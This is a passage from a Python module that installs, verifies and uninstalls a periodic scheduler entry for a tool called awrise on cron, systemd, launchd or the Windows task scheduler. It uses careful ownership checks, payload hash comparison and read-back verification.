    """Payload paths that should exist and do not."""
    return [target for target in artifact_targets(kind, ctx).values() if not os.path.exists(target)]


def payloads_changed(kind: str, ctx: Context, record: Optional[dict]) -> List[str]:
    """Payload paths whose CONTENT is no longer the bytes the record installed.

    Existence is not currency. The scheduler entry keeps firing a payload that
    something else rewrote, truncated or half-wrote, and every wake then dies
    before awrise opens the ledger -- a clock that is registered, enabled, on
    schedule and does nothing, which is indistinguishable from one that
    stopped. The record already carries a sha256 per artifact; this is the
    comparison nothing was making.
    """
    if not record:
        return []
    recorded = record.get("artifacts") or {}
    if not isinstance(recorded, dict):
        return []
    changed: List[str] = []
    for name, target in artifact_targets(kind, ctx).items():
        expected = recorded.get(name)
        if not expected:
            continue
        try:
            with open(target, "r", encoding="utf-8", newline="") as handle:
                actual = hashlib.sha256(handle.read().encode("utf-8")).hexdigest()
        except OSError:
            continue  # absence is payloads_present's answer, not this one's
        if actual != expected:
            changed.append(target)
    return changed


# ------------------------------------------------------------ run + read back


def decode(raw) -> str:
    """Text from a scheduler's output, whatever it encoded it in.

    The Windows task scheduler prints its XML as UTF-16, so reading it as
    UTF-8 yields a string full of NUL characters in which no tag ever matches
    -- a read-back that finds nothing and blames the task. A byte-order mark,
    or NULs in the first bytes, is the tell.
    """
    if isinstance(raw, str):
        return raw
    if not raw:
        return ""
    if raw[:2] in (b"\xff\xfe", b"\xfe\xff") or b"\x00" in raw[:64]:
        return raw.decode("utf-16", "replace")
    return raw.decode("utf-8", "replace")


def _run(
    argv: Sequence[str], input_text: Optional[str] = None, timeout: int = 60, binary: bool = False
) -> subprocess.CompletedProcess:
    """Always a list argv, never a shell string.

    A shell in the middle rewrites the scheduler's own switches (a POSIX shell
    on Windows turns ``/query`` into a path), and the failure looks exactly
    like "the task does not exist".
    """
    if binary:
        return subprocess.run(list(argv), capture_output=True, timeout=timeout, check=False)
    return subprocess.run(
        list(argv),
        input=input_text,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=timeout,
        check=False,
    )


def _missing_tool(kind: str, exc: OSError) -> HostClockError:
    return HostClockError(f"cannot judge {kind}: its scheduler is not on this host ({exc})", 2)


def probe(kind: str, ctx: Context) -> Definition:
    """Ask the scheduler what it holds. Raises HostClockError(2) when it cannot
    be asked at all -- an unaskable scheduler is UNJUDGED, never a pass."""
    try:
        if kind == "cron":
            done = _run(["crontab", "-l"])
            lines = [ln for ln in done.stdout.splitlines() if ln.rstrip().endswith(CRON_MARKER)]
            return Definition(
                bool(lines), bool(lines), lines[0].strip() if lines else "no marked crontab line"
            )
        if kind in ("systemd-user", "systemd-system"):
            scope = ["--user"] if kind == "systemd-user" else []
            done = _run(["systemctl", *scope, "list-timers", "--all", "--no-pager"])
            present = TASK_NAME in done.stdout
            state = _run(["systemctl", *scope, "is-enabled", "awrise.timer"])
            enabled = state.stdout.strip().startswith("enabled")
            return Definition(
                present, present and enabled, (state.stdout or state.stderr).strip() or "no timer"
            )
        if kind == "launchd":
            done = _run(["launchctl", "list"])
            present = LAUNCHD_LABEL in done.stdout
            return Definition(present, present, LAUNCHD_LABEL if present else "not loaded")
        if kind == "schtasks":
            done = _run([_schtasks_exe(), "/query", "/tn", TASK_NAME, "/xml", "ONE"], binary=True)
            if done.returncode != 0:
                detail = decode(done.stderr or done.stdout).strip()[:200]
                return Definition(False, False, detail or "not registered")
            xml = decode(done.stdout)
            enabled = "<Enabled>false</Enabled>" not in xml.replace(" ", "")
            return Definition(True, enabled, "registered" + ("" if enabled else ", DISABLED"))
    except OSError as exc:
        raise _missing_tool(kind, exc) from exc
    except subprocess.SubprocessError as exc:
        raise HostClockError(f"cannot judge {kind}: {exc}", 2) from exc
    raise HostClockError(f"unknown host clock {kind!r}", 2)


def preflight(kind: str) -> Optional[str]:
    """Why a real install cannot be attempted here, or None."""
    if kind == "schtasks" and os.name != "nt":
        return "the Windows task scheduler exists only on Windows"
    if kind in ("cron", "systemd-user", "systemd-system", "launchd") and os.name == "nt":
        return f"{kind} does not exist on Windows"
    if kind == "systemd-user" and not os.path.isdir("/run/systemd/system"):
        return "systemd is not the init system on this host"
    if kind == "systemd-system" and not os.path.isdir("/run/systemd/system"):
        return "systemd is not the init system on this host"
    if kind == "systemd-user" and not (
        os.environ.get("XDG_RUNTIME_DIR") or os.environ.get("DBUS_SESSION_BUS_ADDRESS")
    ):
        return (
            "no user session bus; a user timer needs a logged-in session or "
            "lingering enabled -- use --systemd-system instead"
        )
    if kind == "launchd" and sys.platform != "darwin":
        return "launchd exists only on macOS"
    return None


def _schtasks_definition_xml(name: str) -> Optional[str]:
    """A task's definition, or None when the scheduler holds no such task."""
    done = _run([_schtasks_exe(), "/query", "/tn", name, "/xml", "ONE"], binary=True)
    if done.returncode != 0:
        return None
    return decode(done.stdout)


def foreign_entries(kind: str, ctx: Context) -> List[str]:
    """Entries under our names that this tool did not create.

    The adapters register by NAME, and ``/create /f`` and ``/delete /f`` ask no
    questions: a host that already has a task called ``awrise`` would have it
    overwritten by an install and destroyed by an uninstall, with no way back.
    Ownership is read off the definition itself -- our tasks launch the payload
    this module renders -- so it still holds for a task an earlier awrise
    installed on a machine whose install record is long gone.

    cron is owned by its marker (a line this tool never wrote cannot end in
    it), and the systemd and launchd files are judged one by one against the
    generated marker before anything overwrites them.
    """
    if kind != "schtasks":
        return []
    foreign = []
    for name in (TASK_NAME, BOOT_TASK_NAME):
        xml = _schtasks_definition_xml(name)
        if xml is None:
            continue
        if "run-due.cmd" not in xml.lower():
            foreign.append(name)
    return foreign


def _refuse_foreign_entry(kind: str, ctx: Context, verb: str) -> None:
    names = foreign_entries(kind, ctx)
    if names:
        raise HostClockError(
            f"the scheduled task(s) {', '.join(names)} already exist on this host and do "
            f"not launch awrise's payload, so this awrise did not create them. Refusing "
            f"to {verb} a task somebody else owns -- rename or remove it first.",
            1,
        )


def _existing_crontab(action: str) -> List[str]:
    """Every line of the caller's crontab, or a refusal to guess.

    ``crontab -l`` exits non-zero for two very different reasons: there is no
    crontab yet (nothing to keep), or it could not be READ -- a locked spool, a
    concurrent ``crontab -e``, an I/O error. Both print nothing on stdout, and
    reading the second as "empty" hands ``crontab -`` a file with every other
    entry deleted: silently, irreversibly, with rc 0. So only the first is
    treated as empty, and anything else stops the write.
    """
    done = _run(["crontab", "-l"])
    if done.returncode == 0:
        return done.stdout.splitlines()
    message = ((done.stderr or "") + " " + (done.stdout or "")).strip()
    if "no crontab" in message.lower():
        return []
    raise HostClockError(
        f"cannot read the existing crontab, so {action} it would delete entries this "
        f"tool never wrote: {message or 'crontab -l exited ' + str(done.returncode)}",
        2,
    )


def _register(kind: str, ctx: Context, notes: Optional[List[str]] = None) -> List[List[str]]:
    """Run the commands that create the entry; return what was run.

    ``notes`` collects what was registered PARTIALLY: on Windows the interval
    entry is required and the at-startup entry is best effort, because the
    second one needs elevation the first does not (measured 2026-09-18) and
    refusing the whole install over it leaves the host with no clock at all.
    """
    ran: List[List[str]] = []
    try:
        if kind == "cron":
            keep = [
                ln
                for ln in _existing_crontab("installing into")
                if not ln.rstrip().endswith(CRON_MARKER)
            ]
            keep.append(_render_cron(ctx)["crontab-line"].rstrip("\n"))
            argv = ["crontab", "-"]
            done = _run(argv, input_text="\n".join(keep) + "\n")
            ran.append(argv)
            if done.returncode != 0:
                raise HostClockError(
                    f"crontab refused the line: {(done.stderr or done.stdout).strip()}", 1
                )
        elif kind in ("systemd-user", "systemd-system"):
            scope = ["--user"] if kind == "systemd-user" else []
            for argv in [
                ["systemctl", *scope, "daemon-reload"],
                ["systemctl", *scope, "enable", "--now", "awrise.timer"],
            ]:
                done = _run(argv)
                ran.append(argv)
                if done.returncode != 0:
                    raise HostClockError(
                        f"{' '.join(argv)} failed: {(done.stderr or done.stdout).strip()}", 1
                    )
        elif kind == "launchd":
            plist = artifact_targets(kind, ctx)[LAUNCHD_LABEL + ".plist"]
            _run(["launchctl", "unload", plist])
            argv = ["launchctl", "load", plist]
            done = _run(argv)
            ran.append(argv)
            if done.returncode != 0:
                raise HostClockError(
                    f"launchctl load failed: {(done.stderr or done.stdout).strip()}", 1
                )
        elif kind == "schtasks":
            _refuse_foreign_entry(kind, ctx, "overwrite")
            for argv in schtasks_commands(ctx):
                done = _run(argv)
                ran.append(argv)
                if done.returncode == 0:
                    continue
                detail = (done.stderr or done.stdout).strip()
                if _task_name_of(argv) != BOOT_TASK_NAME:
                    raise HostClockError(f"the scheduler refused the create: {detail}", 1)
                if notes is not None:
                    notes.append(boot_entry_gap_line(ctx, detail))
            for name in (TASK_NAME, BOOT_TASK_NAME):
                if _schtasks_definition_xml(name) is not None:
                    _apply_battery_settings(name, notes)
    except OSError as exc:
        raise _missing_tool(kind, exc) from exc
    except subprocess.SubprocessError as exc:
        raise HostClockError(f"could not register the {kind} entry: {exc}", 2) from exc
    return ran


def _unregister(kind: str, ctx: Context, notes: List[str]) -> List[List[str]]:
    ran: List[List[str]] = []
    try:
        if kind == "cron":
            keep = [
                ln
                for ln in _existing_crontab("removing from")
                if not ln.rstrip().endswith(CRON_MARKER)
            ]
            if keep:
                argv = ["crontab", "-"]
                _run(argv, input_text="\n".join(keep) + "\n")
            else:
                # Ours was the only line. Writing an empty file back is a
                # rewrite of the spool either way; `-r` says what is meant and
                # leaves no empty crontab behind.
                argv = ["crontab", "-r"]
                done = _run(argv)
                if done.returncode != 0:
                    notes.append(
                        "crontab -r: " + ((done.stderr or done.stdout).strip() or "no crontab")
                    )
            ran.append(argv)
        elif kind in ("systemd-user", "systemd-system"):
            scope = ["--user"] if kind == "systemd-user" else []
            for argv in [
                ["systemctl", *scope, "disable", "--now", "awrise.timer"],
                ["systemctl", *scope, "daemon-reload"],
            ]:
                _run(argv)
                ran.append(argv)
        elif kind == "launchd":
            plist = artifact_targets(kind, ctx)[LAUNCHD_LABEL + ".plist"]
            argv = ["launchctl", "unload", plist]
            _run(argv)
            ran.append(argv)
        elif kind == "schtasks":
            _refuse_foreign_entry(kind, ctx, "delete")
            for name in (TASK_NAME, BOOT_TASK_NAME):
                argv = [_schtasks_exe(), "/delete", "/f", "/tn", name]
                _run(argv)
                ran.append(argv)
    except OSError as exc:
        raise _missing_tool(kind, exc) from exc
    except subprocess.SubprocessError as exc:
        raise HostClockError(f"could not remove the {kind} entry: {exc}", 2) from exc
    for target in artifact_targets(kind, ctx).values():
        path = Path(target)
        try:
            existing = path.read_text(encoding="utf-8", errors="replace")
        except FileNotFoundError:
            notes.append(f"no payload at {target}")
            continue
        except OSError as exc:
            notes.append(f"could not read {target}, so it is left in place: {exc}")
            continue
        if GENERATED_MARKER not in existing:
            notes.append(
                f"left {target} in place: no {GENERATED_MARKER} marker, so this "
                f"awrise did not write it"
            )
            continue
        try:
            os.remove(target)
        except OSError as exc:
            # The entry is gone, so nothing will run this file; leaving it is
            # untidy, not unsafe. Saying so beats a silent handler.
            notes.append(f"could not remove {target}: {exc}")
    return ran


# ------------------------------------------------------------- install record


def record_path(base: Optional[Path] = None) -> Path:
    return (base if base is not None else store.home()) / RECORD_NAME


def read_record(base: Optional[Path] = None) -> Optional[dict]:
    path = record_path(base)
    try:
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
    except FileNotFoundError:
        return None
    except (OSError, ValueError):
        # An unreadable record is not an absent one: it is a thing we cannot
        # judge, and the caller turns that into exit 2.
        raise HostClockError(f"{path} exists and cannot be read as an install record", 2)
    if not isinstance(data, dict) or data.get("kind") not in KINDS:
        raise HostClockError(f"{path} is not an install record this version wrote", 2)
    return data


def write_record(
    kind: str, ctx: Context, artifacts: Dict[str, str], base: Optional[Path] = None
) -> dict:
    record = {
        "kind": kind,
        "every_s": ctx.every_s,
        # What the scheduler will really do with it. `every_s` is what was
        # ASKED for, and every adapter here has a floor -- judging freshness
        # against the request calls a correctly firing clock dead.
        "effective_every_s": effective_every_s(kind, ctx.every_s),
        "installed_at": clock.iso(clock.now_utc()),
        "python": ctx.python,
        "home": ctx.home,
        "bin_dir": ctx.bin_dir,
        "version": ctx.version,
        "artifacts": digest(artifacts),
        "targets": artifact_targets(kind, ctx),
    }
    path = record_path(base)
    tmp = path.with_name(path.name + ".tmp")
    with open(tmp, "w", encoding="utf-8", newline="\n") as handle:
        json.dump(record, handle, indent=2, sort_keys=True)
        handle.flush()
        os.fsync(handle.fileno())
    store.replace_file(tmp, path)
    return record


# -------------------------------------------------------------------- verbs


def install(
    kind: str,
    every_s: int = 60,
    dry_run: bool = False,
    print_only: bool = False,
    base: Optional[Path] = None,
) -> Entry:
    """Register the host clock (or say exactly what that would do).

    ``print_only`` and ``dry_run`` touch NOTHING: no file is written, no
    scheduler command is run, no record is kept.
    """
    ctx = context(kind, base=base, every_s=every_s)
    artifacts = render(kind, ctx)
    entry = Entry(kind=kind, installed=False, artifacts=artifacts)
    targets = artifact_targets(kind, ctx)
    effective = effective_every_s(kind, ctx.every_s)
    if effective != ctx.every_s:
        entry.lines.append(
            f"note: {kind} cannot fire every {ctx.every_s}s -- its floor rounds that to "
            f"every {effective}s, and `awrise install --check` judges freshness against "
            f"the {effective}s it will really do"
        )
    if print_only:
        for name, text in artifacts.items():
            entry.lines.append(f"--- {name}" + (f" -> {targets[name]}" if name in targets else ""))
            entry.lines.extend(text.replace("\r\n", "\n").rstrip("\n").splitlines())
        return entry
    if dry_run:
        entry.commands = _planned_commands(kind, ctx)
        for name in artifacts:
            entry.lines.append(f"would write {targets.get(name, '(scheduler database)')} [{name}]")
        for argv in entry.commands:
            entry.lines.append("would run   " + " ".join(argv))
        entry.lines.append("would record " + str(record_path(base)))
        return entry
    blocked = preflight(kind)
    if blocked:
        raise HostClockError(f"cannot install {kind} here: {blocked}", 2)
    entry.lines.extend(f"wrote {path}" for path in _write_payloads(kind, ctx, artifacts))
    entry.commands = _register(kind, ctx, entry.lines)
    entry.lines.extend("ran   " + " ".join(argv) for argv in entry.commands)
    # Read back BEFORE claiming success: a create that reports 0 and registers
    # nothing is the failure mode this whole module exists to catch.
    found = probe(kind, ctx)
    entry.readback = found.detail
    if not found.present:
        raise HostClockError(
            f"the {kind} entry was created and is NOT there when read back ({found.detail}). "
            f"Nothing about this host clock can be claimed.",
            1,
        )
    if not found.enabled:
        raise HostClockError(f"the {kind} entry exists but is disabled ({found.detail})", 1)
    entry.record = write_record(kind, ctx, artifacts, base=base)
    entry.installed = True
    entry.lines.append(f"read back: {found.detail}")
    return entry


def _planned_commands(kind: str, ctx: Context) -> List[List[str]]:
    if kind == "cron":
        return [["crontab", "-"]]
    if kind in ("systemd-user", "systemd-system"):
        scope = ["--user"] if kind == "systemd-user" else []
        return [
            ["systemctl", *scope, "daemon-reload"],
            ["systemctl", *scope, "enable", "--now", "awrise.timer"],
        ]
    if kind == "launchd":
        plist = artifact_targets(kind, ctx)[LAUNCHD_LABEL + ".plist"]
        return [["launchctl", "unload", plist], ["launchctl", "load", plist]]
    if kind == "schtasks":
        return schtasks_commands(ctx)
    return []


def _removal_commands(kind: str, ctx: Context) -> List[List[str]]:
    if kind == "cron":
        return [["crontab", "-"]]
    if kind in ("systemd-user", "systemd-system"):
        scope = ["--user"] if kind == "systemd-user" else []
        return [
            ["systemctl", *scope, "disable", "--now", "awrise.timer"],
            ["systemctl", *scope, "daemon-reload"],
        ]
    if kind == "launchd":
        plist = artifact_targets(kind, ctx)[LAUNCHD_LABEL + ".plist"]
        return [["launchctl", "unload", plist]]
    if kind == "schtasks":
        exe = _schtasks_exe()
        return [[exe, "/delete", "/f", "/tn", name] for name in (TASK_NAME, BOOT_TASK_NAME)]
    return []


def uninstall(kind: str, base: Optional[Path] = None, dry_run: bool = False) -> Entry:
    ctx = context(kind, base=base)
    entry = Entry(kind=kind, installed=False)
    if dry_run:
        targets = list(artifact_targets(kind, ctx).values())
        entry.lines.append(
            "would remove the entry" + (" and " + ", ".join(targets) if targets else "")
        )
        entry.commands = _removal_commands(kind, ctx)
        entry.lines.extend("would run   " + " ".join(argv) for argv in entry.commands)
        if kind == "cron":
            entry.lines.append(
                "            (every line that is not ours is kept; if ours is "
                "the only one, the command is `crontab -r`)"
            )
        return entry
    blocked = preflight(kind)
    if blocked:
        raise HostClockError(f"cannot remove the {kind} entry here: {blocked}", 2)
    entry.commands = _unregister(kind, ctx, entry.lines)
    entry.lines.extend("ran   " + " ".join(argv) for argv in entry.commands)
    path = record_path(base)
    try:
        os.remove(path)
        entry.lines.append(f"removed {path}")
    except FileNotFoundError:
        entry.lines.append(f"no install record at {path}")
    except OSError as exc:
        entry.lines.append(f"could not remove {path}: {exc}")
    found = probe(kind, ctx)
    if found.present:
        raise HostClockError(
            f"the {kind} entry is still registered after removal ({found.detail})", 1
        )
    entry.lines.append("read back: gone")
    return entry


def last_tick(base: Path, invokers: Optional[frozenset] = None) -> Optional[dict]:
    """The most recent ``tick`` row, or None. Reads a bounded window.

    ``invokers`` restricts the rows to passes started by those invokers --
    ``SCHEDULED_INVOKERS`` is the one that answers "is the host clock running",
    because a pass somebody ran by hand writes exactly the same row.
    """
    rows = ledger.read(base, since=timedelta(days=2))
    ticks = [
        row
        for row in rows
        if row.get("event") == "tick"
        and row.get("ts")
        and (invokers is None or row.get("invoker") in invokers)
    ]
    return ticks[-1] if ticks else None


def tick_age_s(base: Path, invokers: Optional[frozenset] = None) -> Optional[float]:
    row = last_tick(base, invokers)
    if row is None:
        return None
    try:
        stamp = clock.parse_ts(row.get("ts"))
    except (ValueError, TypeError):
        return None
    if stamp is None:
        return None
    return (clock.now_utc() - stamp).total_seconds()


def live_locks(base: Path) -> List[str]:
    """Jobs whose lock is held by a PASS that is running right now.

    A detached child holds its job's lock until it exits -- that is what makes
    "never started a second time" true for ``detach: true`` -- but no
    ``run-due`` is running behind it. ``check`` uses this answer to excuse a
    missing tick ("no fresh tick, but a pass is in progress"), so counting a
    detached child would let one long-lived child mask a host clock that has
    stopped. The wake is in flight; the pass is not.
    """
    try:
        jobs = store.load(base)
    except store.StoreError:
        return []
    live = []
    for name, job in jobs.items():
        held = lock.inspect(base, name, job.get("timeout_s"))
        if held is not None and not held.detached:
            live.append(name)
    return live


def check(kind: Optional[str] = None, base: Optional[Path] = None) -> Tuple[int, List[str]]:
    """0 the clock is installed and ticking, 1 a measured NO, 2 UNJUDGED.

    UNJUDGED is not a technicality. A stranger's own cron line running awrise
    is a perfectly good clock this brick did not install, and calling that a
    violation would teach an operator to ignore the check.
    """
    lines: List[str] = []
    home_path = base if base is not None else store.home()
    record = read_record(base)
    if record is None:
        lines.append(
            "UNJUDGED: no install record -- this awrise did not register a host "
            "clock, so there is nothing of ours to judge. `awrise install --help`"
        )
        return 2, lines
    kind = kind or record["kind"]
    if kind != record["kind"]:
        lines.append(f"UNJUDGED: the record holds {record['kind']}, not {kind}")
        return 2, lines
    every_s = float(record.get("every_s") or 60)
    # The record of an older install carries only what was asked for; derive
    # the same number it would have stored rather than judging by the request.
    effective = float(record.get("effective_every_s") or effective_every_s(kind, int(every_s)))
    ctx = context(kind, base=base, every_s=int(every_s), python=record.get("python"))
    ctx = Context(
        python=ctx.python,
        home=record.get("home", ctx.home),
        bin_dir=record.get("bin_dir", ctx.bin_dir),
        log_path=ctx.log_path,
        every_s=int(every_s),
        user=ctx.user,
        version=ctx.version,
        sep=ctx.sep,
    )
    found = probe(kind, ctx)
    lines.append(f"definition: {'present' if found.present else 'ABSENT'} ({found.detail})")
    verdict = 0
    if not found.present:
        lines.append(f"NOT OK: the {kind} entry this awrise installed is gone")
        return 1, lines
    if not found.enabled:
        lines.append(f"NOT OK: the {kind} entry is registered but disabled")
        verdict = 1
    missing = payloads_present(kind, ctx)
    changed = payloads_changed(kind, ctx, record)
    if missing:
        lines.append("NOT OK: the registered payload is missing: " + ", ".join(missing))
        verdict = 1
    elif changed:
        lines.append(
            "NOT OK: the registered payload is not the file this awrise installed: "
            + ", ".join(changed)
            + " -- the entry fires it and the wake dies before the ledger is opened. "
            "`awrise install-clock --force` rewrites it."
        )
        verdict = 1
    else:
        lines.append(f"payload: {len(artifact_targets(kind, ctx))} file(s) present")
    lines.extend(boot_entry_notes(kind, ctx))
    # SCHEDULED ticks only: a pass somebody ran by hand writes the same row, and
    # reading it as freshness certifies a clock that has never fired.
    age = tick_age_s(home_path, SCHEDULED_INVOKERS)
    bound = effective * TICK_GRACE_FACTOR
    if effective != every_s:
        lines.append(
            f"interval: asked for {int(every_s)}s, the scheduler does "
            f"{int(effective)}s; judged against {int(effective)}s"
        )
    if age is not None and age < -TICK_FUTURE_TOLERANCE_S:
        # A window bounded only from above lets a single future-stamped tick
        # certify a clock that has been dead for hours.
        lines.append(
            f"NOT OK: the last tick is stamped {int(-age)}s in the FUTURE "
            f"(clock_skew) -- a wake that has not happened yet cannot show the "
            f"clock is running, and the host clock moving backwards is itself "
            f"the thing to fix"
        )
        return 1, lines
    if age is not None and age <= bound:
        lines.append(f"last tick: {int(age)}s ago (bound {int(bound)}s)")
        return verdict, lines
    live = live_locks(home_path)
    if live:
        lines.append(f"no fresh tick, but a pass is in progress: {', '.join(live)}")
        return verdict, lines
    try:
        installed_at = clock.parse_ts(record.get("installed_at"))
    except (ValueError, TypeError):
        installed_at = None
    since_install = (
        None if installed_at is None else (clock.now_utc() - installed_at).total_seconds()
    )
    if age is None and (since_install is None or since_install < bound):
        when = "just now" if since_install is None else f"{int(since_install)}s ago"
        lines.append(
            f"UNJUDGED: installed {when} and no tick yet; under "
            f"{int(bound)}s there is nothing to judge"
        )
        return 2, lines
    reported = "never by a host clock" if age is None else tick_age_phrase(age)
    lines.append(
        f"NOT OK: the entry exists but the last scheduled tick was {reported} "
        f"(bound {int(bound)}s) -- the clock is registered and not running"
    )
    if age is None:
        # Say it before the operator says it: they may have just run a pass by
        # hand and be looking at its ledger rows while this prints NOT OK.
        any_age = tick_age_s(home_path)
        if any_age is not None:
            lines.append(
                f"          (a pass ran {tick_age_phrase(any_age)}, but not from a "
                f"scheduler -- a hand-run pass is not the clock firing)"
            )
    return 1, lines
